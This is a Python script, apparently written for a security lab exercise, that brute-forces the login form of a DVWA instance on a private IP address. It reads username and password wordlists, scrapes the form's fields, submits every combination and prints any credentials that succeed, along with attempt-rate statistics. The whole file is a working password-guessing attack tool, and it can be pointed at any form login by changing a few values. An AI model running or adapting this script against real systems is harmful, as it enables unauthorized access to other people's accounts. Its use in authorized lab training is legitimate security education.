import requests
from bs4 import BeautifulSoup
from datetime import datetime

def hydra_attack(target_url, login_url, form_data, username_file, password_file):
    # Load username and password dictionaries
    with open(username_file, 'r') as user_file:
        usernames = user_file.read().splitlines()
    
    with open(password_file, 'r', encoding='ISO-8859-1') as pass_file:
        passwords = pass_file.read().splitlines()

    # Session to persist cookies across requests
    session = requests.Session()

    # Initial GET request to get the login form and any necessary cookies
    response = session.get(target_url + login_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract form parameters
    form_params = {}
    for input_tag in soup.find_all('input'):
        if 'name' in input_tag.attrs and 'value' in input_tag.attrs:
            form_params[input_tag['name']] = input_tag['value']

    # Track the start time
    start_time = datetime.now()

    # Perform the brute-force attack
    total_attempts = 0
    for username in usernames:
        for password in passwords:
            total_attempts += 1

            # Update form parameters with current username and password
            form_params['username'] = username
            form_params['password'] = password

            # POST request to submit the login form
            response = session.post(target_url + login_url, data=form_params)

            # Check if login failed based on the response content
            if 'login failed' not in response.text.lower():
                print(f"Successful login for {username}:{password}")

    # Calculate the elapsed time
    elapsed_time = datetime.now() - start_time

    # Calculate passwords per second
    passwords_per_second = total_attempts / elapsed_time.total_seconds()

    # Print the results
    print(f"\nResults:")
    print(f"a. The username and password were not printed in this version of the script.")
    print(f"b. Approximately {passwords_per_second:.2f} passwords per second were tried.")
    print(f"b. Total passwords tried: {total_attempts}")
    print(f"b. Time stopped: {datetime.now()}")

if __name__ == "__main__":
    target_url = "http://192.168.222.133"
    login_url = "/dvwa/login.php"
    form_data = {"Login": "submit"}
    username_file = "user11.txt"
    password_file = "pass11.txt"

    hydra_attack(target_url, login_url, form_data, username_file, password_file)
